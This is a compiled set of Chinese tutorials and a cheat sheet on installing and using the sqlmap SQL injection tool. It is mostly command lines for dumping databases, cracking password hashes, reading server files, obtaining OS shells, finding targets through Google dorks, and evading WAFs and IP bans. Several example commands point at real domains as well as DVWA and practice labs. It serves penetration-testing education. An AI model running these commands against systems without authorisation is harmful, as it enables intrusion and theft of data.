# mac安装sqlmap
通过python安装
pip install sqlmap

# 揭秘最为知名的黑客工具之一：SQLMap
```text
https://zhuanlan.zhihu.com/p/705693506

SQLMap 工具介绍与使用教程

工具介绍

SQLMap 是一款开源的自动化 SQL 注入工具，能够帮助渗透测试人员和安全研究人员检测和利用 SQL 注入漏洞。SQLMap 支持多种数据库管理系统，包括 MySQL、Oracle、PostgreSQL、Microsoft SQL Server 等。它提供了丰富的功能，可以自动识别数据库类型、提取数据、执行命令等。

功能与特点

数据库自动识别：自动检测目标数据库管理系统。
数据提取：支持提取数据库中的数据，包括表结构、数据记录等。
命令执行：支持在目标数据库上执行任意 SQL 命令。
多种注入技术：支持基于时间、布尔、堆叠查询、错误的注入技术。
广泛的数据库支持：支持 MySQL、Oracle、PostgreSQL、Microsoft SQL Server 等多种数据库。


使用教程

以下是使用 SQLMap 进行 SQL 注入测试的详细教程。



步骤一：安装 SQLMap

在 Linux 上安装
1. 更新系统包管理器：

打开终端，运行以下命令更新系统包管理器：

sudo apt update
2. 安装 Git：如果系统未安装 Git，可以运行以下命令进行安装：

sudo apt install git
从 GitHub 克隆 SQLMap 仓库：使用 Git 克隆 SQLMap 的官方仓库：

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
3 进入 SQLMap 目录：

cd sqlmap-dev


在 Windows 上安装

安装 Python：

SQLMap 依赖于 Python，请确保系统安装了 Python（推荐 Python 3）。可以从 Python 官网下载并安装 Python。

下载 SQLMap：

访问 SQLMap 的 GitHub 页面，点击“Code”按钮并选择“Download ZIP”下载 ZIP 文件。

解压 ZIP 文件：

将下载的 ZIP 文件解压到一个目录中。

进入 SQLMap 目录：

打开命令提示符，导航到解压后的 SQLMap 目录。



步骤二：使用 SQLMap 进行 SQL 注入测试

基础命令：

SQLMap 的基本用法是通过命令行指定目标 URL 进行注入测试。以下是一个简单的命令示例：

python sqlmap.py -u "http://example.com/vulnerable_page.php?id=1"
这条命令会自动检测并利用 URL 参数 id 中的 SQL 注入漏洞。

指定请求方法：

如果目标 URL 需要使用 POST 请求，可以使用 --data 选项指定 POST 数据：

python sqlmap.py -u "http://example.com/vulnerable_page.php" --data "id=1"
获取数据库信息：

使用 --dbs 选项列出所有数据库：

python sqlmap.py -u "http://example.com/vulnerable_page.php?id=1" --dbs
获取数据库表：

使用 -D 选项指定数据库，并使用 --tables 选项列出所有表：

python sqlmap.py -u "http://example.com/vulnerable_page.php?id=1" -D exampledb --tables
获取表中的数据：

使用 -T 选项指定表，并使用 --columns 选项列出所有列，然后使用 --dump 选项导出数据：

python sqlmap.py -u "http://example.com/vulnerable_page.php?id=1" -D exampledb -T exampletable --columns


执行任意 SQL 命令：

使用 --sql-query 选项执行自定义 SQL 命令：

python sqlmap.py -u "http://example.com/vulnerable_page.php?id=1" --sql-query "SELECT user, password FROM users"


步骤三：生成报告

1. 保存扫描结果：

使用 -o 选项保存扫描结果：

python sqlmap.py -u "http://example.com/vulnerable_page.php?id=1" -o
2. 导出扫描报告：

SQLMap 可以将扫描结果导出为各种格式（如 HTML、TXT），使用 --output-dir 选项指定输出目录：

python sqlmap.py -u "http://example.com/vulnerable_page.php?id=1" --output-dir="/path/to/output"


总结

SQLMap 是一款功能强大的自动化 SQL 注入工具，通过其丰富的功能和易用的命令行接口，能够帮助用户有效地检测和利用 SQL 注入漏洞。本文详细介绍了 SQLMap 的安装过程和使用方法，涵盖了从基本命令到高级功能的多个方面。在实际操作中，请务必遵守相关法律法规，仅在合法授权的情况下使用该工具。
```


# 百度AI mac安装sqlmap

```text
在 macOS 上安装 sqlmap 是一项相对简单的过程，因为 sqlmap 是用 Python 编写的，而 macOS 自带了 Python 版本，所以你只需要通过 pip（Python 的包管理工具）来安装它。以下是步骤：

1. 安装 Homebrew

首先，确保你的 macOS 上安装了 Homebrew。Homebrew 是 macOS 的一个包管理器，可以让你轻松安装软件包。打开终端（Terminal），然后输入以下命令来安装 Homebrew（如果你已经安装了 Homebrew，可以跳过这一步）：

/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
2. 安装 Python 和 pip

虽然 macOS 自带 Python，但为了管理方便，你可以通过 Homebrew 安装最新版本的 Python 和 pip。打开终端，然后输入以下命令：

brew install python
3. 安装 sqlmap

一旦你安装了 Python 和 pip，就可以通过 pip 安装 sqlmap 了。打开终端，输入以下命令：

pip install sqlmap
4. 验证安装

安装完成后，你可以通过在终端中输入以下命令来验证 sqlmap 是否正确安装：

sqlmap --version

如果这个命令返回了 sqlmap 的版本号，那么恭喜你，sqlmap 已经成功安装在你的 macOS 上。

注意事项：

权限问题：如果你在安装过程中遇到权限问题（例如，pip 需要管理员权限），你可以在命令前加上 sudo 来提升权限，例如 sudo pip install sqlmap。但通常推荐使用 Homebrew 安装的 Python 和 pip 来避免这类问题。

使用 Homebrew 的 Python：为了确保使用正确的 Python 和 pip，你可以直接使用 Homebrew 安装的版本。你可以通过指定路径来调用它们，例如使用 brew --prefix python 来找到 Homebrew 安装的 Python 的路径，然后使用该路径下的 pip 来安装 sqlmap。例如：

/usr/local/bin/pip3 install sqlmap

这里的 /usr/local/bin/pip3 是根据你的 Homebrew 安装位置可能有所不同，你可以通过 brew --prefix python 来找到正确的 pip 路径。

通过以上步骤，你应该可以在你的 macOS 上成功安装 sqlmap。如果你遇到任何问题，检查你的网络连接或尝试更新你的 Homebrew 和 pip 到最新版本可能会有所帮助。更新 Homebrew 可以使用 brew update 命令，更新 pip 可以使用 pip install --upgrade pip。
```

# 渗透测试工具：SQLmap安装教程及使用
```text
https://blog.csdn.net/m0_61869253/article/details/145965459

渗透测试工具：SQLmap安装教程及使用
SQLmap简介

Sqlmap是一款开源的渗透测试工具

🚀下载及安装

下载地址：http://sqlmap.org/

windows或mac下载第一个，linux下载第二个

kali默认自带sqlmap不需要安装



解压刚下载好的压缩包后，重命名为sqlmap

移动到python目录下



复制sqlmap的路径，我的是D:\Python\SQLMap



回到桌面，右击新建 > 快捷方式



快捷方式名



创建成功！右击选择属性，更改起始位置



双击sqlmap的快捷图标，输入python sqlmap.py，验证是否安装成功



02

SQLmap的使用

在注入的url中要包含参数和cookie值，通过sqlmap工具中–cookie参数带上cookie值

抓包查找cookie值后写在–cookie后方



分析测试结果



💦参数详解

1️⃣target：目标

-u	目标url
-m 	将目标地址保存在文件中，一行为一个URL地址进行批量检测-r	从文件中加载http请求-d  直接连接数据库的连接字符-l  从Burp或者websscarab代理日志文件中分析目标-x  从远程网站地图（sitemap.xml）文件来解析目标-g  从谷歌中加载结果目标url（只获取前100个结果，需要挂代理）-c  从配置ini文件中加载选项
1
2
目标URL

python sqlmap.py -u "目标url" --batch --cookie "cookie值"
1
–batch：sqlmap帮你判断选择yes或no
–cookie：登陆后扫描
从文本中获取多个目标扫描

python sqlmap.py -m 1.txt --batch
1
1.txt文件中保存url格式如下，sqlmap会一个一个检测

www.magedu1.com/vu1n1.php?q=q=student
www.magedu2.com/vuln2.asp?id=1www.magedu3.com/vuln3/id/1*
1
2
从文件中加载http请求

python sqlmap.py -r 1.txt --batch
1
直接把bp抓到的请求包复制到一个文本文件里，这样可以让我们省去写cookie和url等参数

比如1.txt文本文件内容如下：

POST/students.php
HTTP/1.1Host:www.magedu.comUser-Agent:Mozilla/4.0
id=1
1
2
3
2️⃣Request：请求设置

--method 指定请求方法
--data	把数据以post方式提交--param 当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数--cookie 设置提交请求的时候附带所设置的cookie--load-cookie 从文件获取cookie--user-agent 可以使用–user-anget参数来修改--headers 可以通过–headers参数来增加额外的http头--proxy 设置代理，可以避免本机地址被封禁--delay 可以设定两个HTTP(S)请求间的延迟防止发送过快导致被封ip--random-agent 使用–random-agnet参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入--referer 在请求目标的时候可以自己伪造请求包中的referer–-level 参数设定为3或者3以上的时候会尝试对referer注入--scope	利用正则过滤目标网址
1
2
把数据以POST方式提交

当参数写在url里会当成get方式，–data可以用post方式提交并进行检测

python sqlmap.py -u "http://www.baidu.com/students.php" --data="id=1" -f --banner --dbs --users
1
–banner：指纹信息
–dbs：数据库
–users：表名
利用正则过滤目标网址

python sqlmap.py -l burp_http.log --scope="(www)?\.tagdet\.(com|net|org)"
1
burp_http.log：从bp中加载的日志文件

避免过多的错误请求被屏蔽

sql注入的过程也可以理解成爆破的过程，在这么多的请求中也会有大量的报错请求，而有的网站会有一些保护机制，使用这个参数可以避免发送过多的错误请求导致ip被封掉

参数：–safe-url,–safe-freq

--safe-url：提供一个安全不错误的链接，每隔一段时间都会去访问一下
--safe-freq：提供一个安全不错误的链接，每次测试请求之后都会在访问一遍安全连接
1
2
3️⃣Optimization：优化

-o  开启所有优化开关
1
4️⃣Injection：注入

-p 想要测试的参数
-skip 不想要测试的参数--dbms 指定数据库，节省sqlmap的检测时间--os 指定数据库服务系统，节省sqlmap的检测时间--tamper 使用sqlmap自带的tamper（脚本），或者自己写的tamper，来混淆payload，通常用来绕过waf和ips
1
2
测试参数

-p：指定测试的参数

-p "id,user-anget"
1
–skip：指定要跳过的参数

--skip="user-agent,referer"
1
指定数据库服务器系统

参数：–OS

一方面可以提速，另一方面降低被发现的可能性

指定大数字来使值无效

参数：–invalid-bignum

当用户想指定一个报错的数值时，可以使用这个参数，比如指定id=9999999999

指定逻辑运算来使值无效

参数：–invalid-logical

原理同上，比如指定id=1 and 18=19结果为假，从而引起报错，让你查不到内容

5️⃣Detection：探测等级

--level=1 执行测试的等级（1~5，默认为1）
--risk 共有四个风险等级（0~3）（慎用）
1
2
探测等级

参数：–level

共有5个等级，默认为1，最大为5

1级：不会探测http header
2级：探测加上cookie
3级：探测加上HTTP User-Agent/Refere
总之在不确定哪个payload或者参数为注入点时，为了保证全面性，建议使用高的level值

风险等级

参数：–risk

共有3个风险等级，默认是1

1会测试大部分的测试语句
2会增加基于事件的测试语句
3会增加or语句的SQL注入测试
有时候，例如在updata、delete的语句中，注入一个or的测试语句，可能导致更新或删除整个表，造成很大的风险

在工作中–risk谨慎使用，会对业务造成伤害

6️⃣fingerprint：指纹

-f ，--fingerprint 执行检查广泛的dbms版本指纹
1
7️⃣enumeration：枚举

-a，--all  获取所有信息
-b，--banner 	 获取数据库挂你系统的表示--current-user 	  获取数据库管理系统当前数据库--hostname 		  获取数据库服务器的主机名称--is-dba          检测DBMS当前用户是否是DBA（数据库管理员）--users           枚举数据库管理系统用户--passwords       枚举数据库管理系统用户密码哈希--privieges		  枚举数据库管理系统用户的权限--roles           枚举数据库管理系统用户的角色--dbs             枚举数据库管理系统数据库--tables          枚举DBMS数据库中的表--columns         枚举DBMS数据库中的表--schema          枚举数据库架构--count           检索表的项目数--dump            转储数据库表项，即下载--dump-all        转储数据库所有表项--search          搜索列（s），表（s）和/或数据库名称（s）--comments        获取DBMS注释-D                要进行枚举的指定数据库名-T                DBMS数据库表枚举-C                DBMS数据库表列枚举-X                DBMS数据库表不进行枚举-U                用来进行枚举的数据库用户--exclude-sysdbs  枚举表时排除系统数据库--pivot-column=p.. privot columnname--where=DUMPWHERE  USE WHEREcondition while table dumping--start=LIMITSTART 获取第一个查询输出数据位置--stop=LIMITSTOP   获取最后查询的输出数据--first=FIRSTCHAR  第一个查询输出字的字符获取--last=LASTCHAR    最后查询的输出字字符获取--sql-query=QUERY  要执行的SQL语句--sql-shell        提示交互式SQL的shell--sql-file=SQLFILE 要执行的SQL文件
1
2
标识

参数：-b，-banner

数据库版本信息

当前用户

参数：–current-user

当前数据库

参数：–current-db

当前用户是否为管理员

参数：–is-dba

列出数据库管理用户

参数：–users

列出并破解数据库用户的hash值

参数：–passwords

列出数据库系统中的数据库

参数：–dbs

python sqlmap.py -r 1.txt  --dbs
1
列举数据库表

参数：–tables、–exclude-sysdbs、-D

列举数据库表中的字段

参数：–columns，-C，-T，-D

8️⃣Brute force：爆破

--common-tables 检查存在共同表
--common-columns 检查存在共同列--shared-lib=SHLIB 共享库的本地路径
1
2
9️⃣file system access：访问文件系统

--file-read 从后端的数据库管理系统读取文件
--file-writeE上传文件到后端的数据库管理系统--file-dest 后端的数据库管理系统写入文件的绝对路径
1
2
读文件前提：要知道读这个文件的路径



写文件：要指定上传文件，指定上传文件路径



🔟Operating system access：访问操作系统

--os-cmd=OSCMD 执行操作系统命令
--os-shell 交互式的操作系统的shell--os-pwn 获取一个OOB shell，meterpreter或VNC--os-smbrelay 一键获取一个OOB shellmeterpreter或VNC--os-bof 存储过程缓冲区溢出利用--priv-esc 数据库进程用户权限提升--msf-path=MSFPATH Metasploit Framework本地的安装路径--tmp-path=TMPPATH 远程临时文件目录的绝对路径
1
2
获取整个表的数据

参数：-dump，-C，-T，-D，–start，–stop，–first，–last

获取所有数据库表的内容

参数：–dump-all，–exclude-sysdbs

–dump-all获取所有数据库表的内容，可同时加上–exclude-sysdbs排除系统数据库，只获取用户数据库的表，即业务数据

字段、表、数据库

参数：–search -C，-T，-D

运行任意操作系统命令

参数：–os-cmd，–os-shell



–os-shell：直接拿到操作系统的命令行

爬取网站url

参数：–crawl

sqlmap可以收集潜在的可能存在漏洞的链接，后面跟的参数是爬行的深度，此时的url可以不带参数

python sqlmap.py -u "http://www.baidu.com" --crawl=3
1
忽略在会话文件中存储的查询结果

参数：–fresh-queries

如果不想让历史的缓存数据，影响到本次缓存结果，就加上这个参数

自定义输出的路径

参数：–output-dir

默认把缓存结果保存在output文件夹下，可以通过这个参数进行修改

03

实际利用（DVWA）

当给sqlmap一个url时，它会：

判断可注入的参数
判断可以使用哪种SQL注入技术来注入
识别出哪种数据库
根据用户选择，读取哪些数据
dvwa使用sqlmap工具注入流程，如果你想看到sqlmap发送的测试payload最好的等级就是3

# 判断注入点，因系统需要登录所以要加cookiepython sqlmap.py -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir;security=low" -p id
# 检测站点包含哪些数据库python sqlmap.py -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&submit=submit#" --cookie="PHPSESSIE=isgvp2rrv4uts46jbkb9bouq6ir;security=low" -p id --dbs
1
2
技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入“Y/N”来进行下一步操作，可以使用参数–batch命令来自动答复和判断

查看数据库管理系统中有哪些数据库





查看dvwa库下的所有表





查看users表中的字段





获取所有数据





学习计划安排
我一共划分了六个阶段，但并不是说你得学完全部才能上手工作，对于一些初级岗位，学到第三四个阶段就足矣~

这里我整合并且整理成了一份【282G】的网络安全从零基础入门到进阶资料包，需要的小伙伴可以扫描下方CSDN官方合作二维码免费领取哦，无偿分享！！！

如果你对网络安全入门感兴趣，那么你需要的话可以

点击这里👉网络安全重磅福利：入门&进阶全套282G学习资源包免费分享！

①网络安全学习路线
②上百份渗透测试电子书
③安全攻防357页笔记
④50份安全攻防面试指南
⑤安全红队渗透工具包
⑥HW护网行动经验总结
⑦100个漏洞实战案例
⑧安全大厂内部视频资源
⑨历年CTF夺旗赛题解析

```

# 不用再找了，SQLMap基础命令合集版来了
```text
一.SQLMap
1.SQLMap基本介绍
1.1）分析URL

判断可注入的参数
判断目标需要用哪种SQL注入
识别出目标数据库
根据命令，读取数据
1.2）注入方式

布尔盲注：基于SQL语句的比较判断的注入
时间盲注：基于返回结果是否延迟来判断是否存在注入
基于报错注入：通过报错来注入
联合查询注入：先 order by 查看字段数，再union注入。
堆查询注入：多条语句同时注入
注意：
1.可以设定HTTP(S)请求的并发数，来提高盲注时的效率。
2.测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入，它也可以指定用逗号分隔的列表的具体参数来测试。

1.5）支持的数据库

MySQL、Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
1.6）可执行内容

URL地址
Burp或WebScarab请求日志文件，
文本文档中的完整http请求或者Google的搜索，匹配出结果页面
自己定义一个正则来判断那个地址去测试。
1.7）下载地址：

https://github.com/sqlmapproject/sqlmap.git
2.SQLMAP命令——指定目标
这些参数都用于SQLMAP指定目标。

-v ：查看SQL判断和读取数据的方式。共有7个等级。
0、只显示python错误以及严重的信息。
1、同时显示基本信息和警告信息。（默认）
2、同时显示debug信息。
3、同时显示注入的payload。
4、同时显示HTTP请求。
5、同时显示HTTP响应头。
6、同时显示HTTP响应页面。
python sqlmap.py -u 网址 -v 3
1
注意：如果你想看到sqlmap发送的测试payload最好的等级就是3。

2.-u :指定目标网址

python sqlmap.py -u 网址
1
3.-l :从Burp或者WebScarab代理中获取日志.

python sqlmap.py -l ./1.txt
1
注意：需要将burp监听到的数据包，右键保存文件就可让sqlmap使用。

4.-m :指定多个目标网址。需要多个URL以一行一个的格式保存在文本文件中。
比如有url.txt文件，内容如下：

http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1
http://inject2.lab.aqlab.cn:81/Pass-02/index.php?id=1
http://inject2.lab.aqlab.cn:81/Pass-03/index.php?id=1
python sqlmap.py -m ./url.txt
1
5.-r ：从文件中加载HTTP请求。可跳过设置一些其他参数（比如cookie，POST数据，等等）。
比如有 http.txt文件，内容如下：

GET /Pass-01/index.php?id=1 HTTP/1.1
Host: inject2.lab.aqlab.cn:81
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
注意：当请求是HTTPS的时候你需要配合这个—force-ssl参数来使用，或者你可以在Host头后面加上:443

python sqlmap.py -r ./http.txt
1
6.-g ：处理Google的搜索结果（只获取前100个结果）

python sqlmap.py -g "inurl:\".php?id=1\""
1
7.-c：从配置文件中载入攻击目标。SQLMap目录中有一个名为sqlmap.conf的文件，改文件是配置模板。

python sqlmap.py -g "inurl:\".php?id=1\"" -c sqlmap.conf
1
3.SQLMap命令——HTTP请求
这些参数都用于指定HTTP请求细节。

1.–method：一般来说，Sqlmap能自动判断出是使用GET方法还是POST方法，但在某些情况下需要的可能是PUT等很少见的方法。
python sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-03/index.php?id=1 -method=PUT

2.—data :把数据以POST方式提交。

python sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-05/index.php --data="username=admin&password=123456"
1
3.—param-del ：指定分隔符。

python sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-05/index.php --data="username=admin;password=123456" --param-del=";"
1
4.–cookie、–cookie-del、–drop-set-cookie和–load-cookies：cookie请求

要测试的页面只有在登录状态下才能访问，登录状态用cookie识别
想要检测是否存在cookie注入
注意：当“–level”设置为2或更高时，Sqlmap会检测cookie是否存在注入漏洞
4.1）-–cookie和-–cookie-del

python sqlmap.py -u https://hack.zkaq.cn/ --cookie "token=0ecc2&PHPSESSID=s3o" --cookie-del="&"
1
注意：
cookie默认的分隔符为“;”，通过cookie-del来指定分隔符。
cookie值可在浏览器F12中，找到application，里面有cookie值。

4.2）—drop-set-cookie ：忽略HTTP响应头中的“Set-Cookie”设置

python sqlmap.py -u https://hack.zkaq.cn/ --drop-set-cookie
1
4.3）—load-cookies：从文件中载入Netscape或wget格式的cookie。

python sqlmap.py -u https://hack.zkaq.cn/ --load-cookies cookies.txt
1
5.—user-agent、 —random-agent：设置head头中的用户代理

python sqlmap.py -u https://hack.zkaq.cn/ --user-agent="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0"``python sqlmap.py -u https://hack.zkaq.cn/ --random-agent
1
注意：当“–level”设置为3或更高时，Sqlmap会检测User-Agent是否存在注入漏洞

6.—host 手动指定HTTP头中的Host值。

python sqlmap.py -u https://hack.zkaq.cn/ --host="inject2.lab.aqlab.cn:81"
1
注意：当“–level”设置为5或更高时，Sqlmap会检测Host是否存在注入漏洞

7.—referer ：指定HTTP头中的Referer值。Sqlmap发送的HTTP请求头部默认无Referer字段。

python sqlmap.py -u https://hack.zkaq.cn/ --referer="www.baidu.com"
1
8.–-headers :在Sqlmap发送的HTTP请求报文头部添加字段，若添加多个字段，用“\n”分隔。

python sqlmap.py -u https://hack.zkaq.cn/ --headers "X-A:A\nX-B: B"
1
发送的数据包为：

GET /Pass-01/index.php?id=1 HTTP/1.1
X-B: B
X-A: A
Host: inject2.lab.aqlab.cn:81
9.-–auth-type、-–auth-cred ：身份认证

–auth-type用于指定认证方式，支持以下三种身份认证方式：Basic(基本身份验证)、Digest(摘要式身份认证)、NTLM(NTLM身份验证（windows）)
-–auth-cred用于给出身份认证的凭证，格式是“username:password”。
python sqlmap.py -u https://hack.zkaq.cn/ --auth-type Basic --auth-cred "admin:123456"
1
10.–-auth-file :基于证书的身份认证 (不常用)

python sqlmap.py -u https://hack.zkaq.cn/ --auth-file=="ca.PEM"
1
**注意：需要含有私钥的PEM格式证书文件或PEM格式的证书链文件

11.-–ignore-401 ：使用该参数忽略401错误（未认证）。

python sqlmap.py -u https://hack.zkaq.cn/ --ignore-401
1
12.–proxy、–proxy-cred、–proxy-file和–ignore-proxy :HTTP(S)代理

—proxy=”http(s)😕/url:port” :设置一个HTTP(S)代理
-–proxy-cred=”username:password”：提供认证凭证
–-proxy-file ：指定一个存储着代理列表的文件，Sqlmap会依次使用文件中的代理。
-–ignore-proxy ：忽略本地代理设置。若在操作系统设置了代理，后续的一切工作都经过代理）
python sqlmap.py -u https://hack.zkaq.cn/ --proxy="http://127.0.0.1:8087" --proxy-cred="yuweijie:123456" -–proxy-file proxy.txt --gnore-proxy
1
13.–tor、–tor-type、–tor-port和–check-tor ：Tor匿名网络。

14.—delay ：每次http(s)请求之间延迟时间，浮点数，单位为妙，默认无延迟

python sqlmap.py -u https://hack.zkaq.cn/ --delay 3"
1
注意：过于频繁地发送请求可能会被网站察觉或有其他不良后果，使用此参数要好些。

15.—timeout:设置请求超时时间

python sqlmap.py -u https://hack.zkaq.cn/ --timeout 30
1
16.—retries ：超时后最大重试次数。默认3次。

python sqlmap.py -u https://hack.zkaq.cn/ --retries 5
1
17.–-randomize :随机化参数值

python sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --randomize="id"
1
18.—scope :正则表达式过滤代理日志。使用brup抓取的日志文件但 日志文件比较大，你只想检测日志中的一个站点或者某一个特征是否存在sql注入

python sqlmap.py -l burp.txt --scope="(www)?\.baidu\.(com|net|org)"``python sqlmap.py -l burp.txt --scope="(19)?\.168\.20\.(1|10|100)"
1
19.–-safe-url、–-safe-post、–-safe-req和–-safe-freq :避免错误请求过多而被屏蔽

–-safe-url: 隔一会就访问一下的安全URL
-–safe-post: 访问安全URL时携带的POST数据
–-safe-req: 从文件中载入安全HTTP请求
–-safe-freq: 每次测试请求之后都会访问一下的安全URL
注意：有时服务器检测到某个客户端错误请求过多会对其进行屏蔽，而Sqlmap的测试往往会产生大量错误请求，为避免被屏蔽，可以时不时的产生几个正常请求以迷惑服务器。所谓的安全URL是指访问会返回200、没有任何报错的URL。相应地，Sqlmap也不会对安全URL进行任何注入测试。

20.–-skip-urlencode ：关闭URL编码，默认get方法会对传输内容进行编码，某些web服务器不遵循RFC标准编码，使用原始字符提交数据

python sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --skip-urlencode
1
21.-–csrf-token和–-csrf-url ：绕过CSRF保护

–-csrf-token用于指定包含token的隐藏字段名，若这个字段名不是常见的防止CSRF攻击的字段名Sqlmap可能不能自动识别出，需要手动指定。如Django中该字段名为“csrfmiddlewaretoken”，明显与CSRF攻击有关。
–-csrf-url用于从任意的URL中回收token值。若最初有漏洞的目标URL中没有包含token值而又要求在其他地址提取token值时该参数就很有用。
注意：现在有很多网站通过在表单中添加值为随机生成的token的隐藏字段来防止CSRF攻击，Sqlmap会自动识别出这种保护方式并绕过。但自动识别有可能失效。

22.–-force-ssl ：强制使用SSL

23.—eval ：每次请求前执行指定的python代码。有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。

python sqlmap.py -u "https://hack.zkaq.cn/login.php?id=1&hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
1
四.SQLMap命令——优化
这些参数可以优化Sqlmap的性能。

1.—keep-alive :让Sqlmap使用HTTP长连接。该参数与“–proxy”矛盾。

`python sqlmap.py -u “http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1“ —keep-alive

注意：当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 报错的时候，使用这个参数

2.—null-connection：空连接 。从没有实际的HTTP响应体中获取页面长度，常用在盲注中。该参数与“–text-only”矛盾。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --null-connection
1
3.—thread :设置多线程。默认为3。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --thread 5
1
注意：从性能和网站承受能力两方面考虑最大并发数不要超过10。

五.SQLMap命令——注入
这些参数被用于指定要测试的参数、定制攻击荷载和选择篡改脚本。

1.-p：设置要测试的参数列表。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" -p "id,user-agent"
1
注意：默认情况下Sqlmap会测试所有GET参数和POST参数，-p则可以用来指定哪些参数要测试。

2.—skip ：设置不要测试的参数列表

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --level=5 --skip="user-agent,referer"
1
注意：有时候伪静态网站底层会这么写 /user/1/，此时SQLMap不会对这样的网站做的参数做测试，这时需要加上“*”即可。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index/1*/"
1
3.—dbms : 指定数据库管理系统

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --dbms="MySQL"
1
注意：只有在很确定时使用“–dbms”，否则还是让Sqlmap自动检测更好些。

4.—os ：指定运行数据库管理系统的操作系统。Windows/Linux

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --os="Windows"
1
5.—invalid-bignum：会取最大数作为无效参数。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --invalid-bignum
1
6.—invalid-logical：用逻辑操作符作为无效参数

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --invalid-logical
1
7.—invalid-string：用字符串作为无效参数

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --invalid-string
1
8.—no-cast ： 关闭payload转换

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --no-cast
1
注意：SQLMap检索结果时默认将所有输入为字符串类型，空值为空白字符。有时候会因此出现问题，这是添加该参数即可。

9.—no-escape：关闭字符串编码

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --no-escape
1
注意：有时候为了缩减payload长度，用户可以使用“–no-escape”来关闭字符串编码。

10.–-prefix ：设置前缀。 -–suffix：设置后缀。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc")
1
注意：有时候需要设置前缀或者后缀才能注入成功,在简单的测试环境下Sqlmap不需要被提供定制的边界范围就能够自动检测并完成注入，但在真实世界中某些应用可能会很复杂如嵌套JOIN查询，此时就需要为Sqlmap指明边界范围

11.–-tamper 修改注入数据

六.SQLMap命令——检测
这些参数被用于设定SQLMap需要检测的内容。

1.—level:设置需要执行的测试等级。最小是1，最大是5.

1 ：默认等级，对GET、POST参数进行全部测试
2 ：会测试cookie
3 ：会测试user-agent
4 ：会测试referer
5 ：会自动破解出cookie、XFF等头部注入
python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --level=3
1
2.—risk ：指定风险等级。最小是1，最大是3

1 ： 默认等级，在大多数情况下对测试目标无害。
2 ： 会增加基于事件的测试语句
3 ： 会增加OR语句的SQL注入测试。若注入点是在UPDATE语句中，使用OR测试可能会修改整个表的数据。（危险！）
python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --risk=2
1
3.–-string ：设定目标字符串让SQLMap以为真页面。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --string="woaini"
1
4.—not-string ： 设定目标字符串让SQLMap以为假页面。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --not-string="woaini"
1
5.—code : 根据code代码判断页面是否为真。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --code=200
1
6.–-titles：根据页面的title内容判断页面是否为真

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --titles="Welcome"
1
7.–-text-only ：让Sqlmap只专注于纯文本内容

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --text-only
1
七.SQLMap命令——注入技术
这些参数用于对特定的SQL注入技术进行调整。

1.—technique：指定检测注入时所用技术，默认情况下Sqlmap会使用自己支持的全部技术进行检测。

B：Boolean-based blind（布尔型注入）
E：Error-based（报错型注入）
U：Union query-based（可联合查询注入）
S：Stacked queries（可多语句查询注入）
T：Time-based blind（基于时间延迟注入）
Q：Inline queries（嵌套查询注入）
python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --technique US
1
注意：想要访问文件系统或是Windows的注册表就一定要添加“S”进行多语句查询注入测试。

2.—time-sec ：设置基于时间延迟注入中延时时长，默认5秒

